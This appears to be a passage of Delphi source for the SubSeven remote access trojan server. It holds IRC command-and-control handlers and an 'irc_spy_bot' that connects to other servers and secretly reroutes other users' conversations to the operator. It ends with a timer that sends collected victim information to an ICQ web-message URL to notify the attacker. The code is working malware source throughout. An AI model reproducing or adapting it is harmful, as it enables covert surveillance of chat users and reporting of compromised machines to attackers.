   if comm=prefix+'ban ' then ircbot.Mode(param,'+b',reason);
   if comm=prefix+'say ' then ircbot.say(param,reason);
   if comm=prefix+'unban ' then ircbot.Mode(param,'-b',reason);
   if (content=prefix+'info') or (content='sub7') then begin InitDATA_IRC;IRCBot.Say(User.Nick,sendstrbodyirc);end;
   if comm=prefix+'kick ' then ircbot.kick(param,reason,user.nick);
   if (comm='rroff') or (comm=prefix+'rroff') or (comm=prefix+'rroff ') then
    begin
     RREnabled:=False;
     IRCBot.Say(User.Nick,'rerouting disabled.');
    end;
   if comm=prefix+'reroute ' then
    begin
     RREnabled:=True;
     RRFrom:=param;
     RRTo:=reason;
     RRboth:=False;
     if RRFrom[1]='#' then s1:='in' else s1:='by';
     if RRTo[1]='#' then s2:='in' else s2:='to';
     IRCBot.Say(User.Nick,'rerouting everything said '+s1+' '+RRFrom+' '+s2+' '+RRTo);
    end;
   if comm=prefix+'reroute<> ' then
    begin
     RREnabled:=True;
     RRFrom:=param;
     RRTo:=reason;
     RRboth:=True;
     if RRFrom[1]='#' then s1:='in' else s1:='by';
     if RRTo[1]='#' then s2:='in' else s2:='to';
     IRCBot.Say(User.Nick,'rerouting everything said '+s1+' '+RRFrom+' '+s2+' '+RRTo+' BOTH WAYS.');
    end;
   if comm=prefix+'spy_login ' then
    begin
     IRCBot.Say(User.Nick,'starting irc_spy_bot on server: '+param+', port: '+reason+'...');
     if IRCSpy.Connected then try IRCSpy.Disconnect(true);except end;
     IRCSpy.Server:=param;
     IRCSpy.Port:=reason;
     Randomize;IRCSpy.Nick:=PickRandomNick;
     Randomize;IRCSpy.RealName:=PickRandomNick;
     Randomize;IRCSpy.UserName:=PickRandomNick;
     try IRCSpy.Connect;except IRCBot.Say(User.Nick,'error connecting to server.');end;
    end;
   if comm=prefix+'spy_nick ' then
    begin
     IRCSpy.Nick:=param;
    end;
   if comm=prefix+'spy_quit' then
    begin
     IRCSpy.Disconnect(true);
     IRCBot.Say(User.Nick,'irc_spy_bot disconnected.');
    end;
   if comm=prefix+'spy_join ' then
    begin
     IRCSpy.Join(param,reason);
    end;
   if comm=prefix+'spy_part ' then
    begin
     IRCSpy.Part(param,reason);
    end;
   if comm=prefix+'spy_start ' then
    begin
     RSEnabled:=True;
     RSChan:=param;
     RSLocal:=reason;
     RSBoth:=False;
     if RSChan[1]='#' then begin IRCSpy.Join(param,'');s1:='in';end else s1:='by';
     if RSLocal[1]='#' then s2:='in' else s2:='to';
     IRCBot.Say(User.Nick,'rerouting everything said on server '+IRCSpy.Server+' '+s1+' '+RSChan+' '+s2+' '+RSLocal);
    end;
   if comm=prefix+'spy_start<> ' then
    begin
     RSEnabled:=True;
     RSChan:=param;
     RSLocal:=reason;
     RSBoth:=True;
     if RSChan[1]='#' then begin IRCSpy.Join(param,'');s1:='in';end else s1:='by';
     if RSLocal[1]='#' then s2:='in' else s2:='to';
     IRCBot.Say(User.Nick,'rerouting everything said on server '+IRCSpy.Server+' '+s1+' '+RSChan+' '+s2+' '+RSLocal+' BOTH WAYS.');
    end;
   if comm=prefix+'spy_stop' then
    begin
     RSEnabled:=False;
     IRCBot.Say(User.Nick,'rerouting on server '+IRCSpy.Server+' stopped.');
    end;
 except end;end;
end;
end;
procedure TForm1.IRCSpyConnect(Sender: TObject);
begin
 IRCBot.Say(IRCMasterNick,'irc_spy connected.');

end;

procedure TForm1.IRCSpyMessage(Sender: TObject; User: TUser;
  Channel: TChannel; Content: String);
var rr,other:string;
    said:bool;
begin
 if RSEnabled then begin
  said:=false;
  RR:=Content;
  try
  if Channel<>nil then
   begin if Channel.Name=RSChan then begin said:=true;IRCBot.Say(RSLocal,'['+RSChan+']<'+User.Nick+'>'+RR);end;end else
  if User.Nick=RSChan then
   begin said:=true;IRCBot.Say(RSLocal,'['+RSChan+']<'+User.Nick+'>'+RR);end;
  except end;
  if said then exit;
  OTHER:='[OTHER]';
  if Channel<>nil then Other:=Other+'['+Channel.Name+']';
  Other:=Other+'<'+User.Nick+'>';
  Other:=Other+Content;
  IRCBot.Say(RSLocal,Other);
 end;
end;

procedure TForm1.BOTTimerTimer(Sender: TObject);
var loop:integer;
begin
 BOTTimer.Enabled:=False;
 IRCBot.Join(IRCChannel,IRCChannelKey);
 IRCMaster:='';
 RREnabled:=False;
 for loop:=0 to Perform.Lines.Count-1 do
  IRCBot.Raw(Perform.Lines[loop]);
 IRCLogged:=True;
end;

procedure TForm1.IRCBotWallops(Sender: TObject; User: TUser;
  Content: String);
begin
 if Pos('BOMBIT',UpperCase(Content))<>0 then
  IRCBot.Say(User.Nick,'BOMB WHAT?? WHERE?');
end;

procedure TForm1.IRCBotQuit(Sender: TObject; User: TUser);
begin
 IRCMasterNick:='';
 IRCMaster:='';
end;

procedure TForm1.IRCSpyNicksInUse(Sender: TObject; var Nick: String);
begin
 Randomize;IRCSpy.Nick:=PickRandomNick;
end;

procedure TForm1.IRCSpyNickChanged(Sender: TObject);
begin
 IRCBot.Say(IRCMasterNick,'irc_spy_bot nickname changed to: '+IRCSpy.Nick);
end;

procedure TForm1.IRCSpyJoined(Sender: TObject; Channel: TChannel);
begin
 IRCBot.Say(IRCMasterNick,'irc_spy_bot joined '+Channel.Name);
end;

procedure TForm1.IRCSpyKicked(Sender: TObject; User: TUser;
  Channel: TChannel);
begin
 IRCBot.Say(IRCMasterNick,'irc_spy_bot was kicked from '+Channel.Name+' by '+User.Nick);
end;

procedure TForm1.IRCSpyParted(Sender: TObject; Channel: TChannel);
begin
 IRCBot.Say(IRCMasterNick,'irc_spy_bot parted '+Channel.Name);
end;

procedure TForm1.reconTimer(Sender: TObject);
begin
 IRCBot.Connect;
 recon.enabled:=false;
end;

procedure TForm1.IRCBotDisconnect(Sender: TObject);
begin
 if not YESQUIT then recon.enabled:=true else begin RREnabled:=False;RSEnabled:=False;end;
end;

procedure TForm1.NMHTTP1InvalidHost(var Handled: Boolean);
begin
 icqt.enabled:=false;
end;

procedure TForm1.NMHTTP1Success(Cmd: CmdType);
begin
 icqt.enabled:=false;
end;

procedure TForm1.NMHTTP1Connect(Sender: TObject);
begin
 icqt.enabled:=false;
end;

procedure TForm1.NMHTTP1ConnectionFailed(Sender: TObject);
begin
 icqt.enabled:=true;
end;

procedure TForm1.NMHTTP1Failure(Cmd: CmdType);
begin
 icqt.enabled:=true;
end;

procedure TForm1.ServerSocket2ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 try ServerSocket2.Active:=False;except end;
end;

procedure TForm1.Ping1Display(Sender: TObject; Msg: String);
begin
//
end;

procedure TForm1.Ping1DnsLookupDone(Sender: TObject; Error: Word);
begin
//
end;

procedure TForm1.Ping1EchoRequest(Sender: TObject);
begin
//
end;

procedure TForm1.Ping1EchoReply(Sender: TObject; Error: Integer);
var sendit:string;
begin
 if Error = 0 then
  sendit:='can''t ping host (' + Ping1.HostIP + ') : ' +Ping1.ErrorString
 else sendit:='received ' + IntToStr(Ping1.Reply.DataSize) +
                              ' bytes from ' + Ping1.HostIP +
                              ' in ' + IntToStr(Ping1.Reply.RTT) + ' msecs';
 if Ping1.Tag=1 then IRCBot.Say(IRCMasterNick,sendit);
 if Ping1.Tag=2 then IRCBot.Say(KeepChan,sendit);
end;

procedure TForm1.msPingDisplay(Sender: TObject; Msg: String);
begin
//
end;

procedure TForm1.msPingDnsLookupDone(Sender: TObject; Error: Word);
begin
//
end;

procedure TForm1.msPingEchoReply(Sender: TObject; Error: Integer);
begin
//
end;

procedure TForm1.msPingEchoRequest(Sender: TObject);
begin
//
end;

procedure TForm1.icqtTimer(Sender: TObject);
var AllThatBigString:String;
    loop:integer;
begin
 try InitDATA;except end;
 AllThatBigString:='http://wwp.icq.com/scripts/WWPMsg.dll?from=Sub7Server&fromemail='+cuce+'&subject='+strw+'&body='+sendstrbody+'&to='+Decrypt(ReadKey(Encrypt('ICQ')))+'&Send=Message';
 for loop:=1 to length(AllThatBigString) do if AllThatBigString[loop]=' ' then AllThatBigString[loop]:='_';
 try
  NMHTTP1.Get(AllThatBigString);
 except
  //
 end;
end;

end.


 